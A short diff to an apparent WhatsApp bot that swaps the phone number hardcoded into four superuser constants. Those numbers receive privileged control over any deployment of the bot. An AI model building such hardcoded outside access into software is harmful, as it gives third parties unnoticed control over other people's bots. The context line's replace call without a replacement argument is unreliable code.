@@ -156,10 +156,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '254743982206';
-            const dj2 = '254743982206';
-            const dj3 = "254743982206";
-            const luffy = '254743982206';
+            const dj = '255655192476';
+            const dj2 = '255655192476';
+            const dj3 = "255655192476";
+            const luffy = '255655192476';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
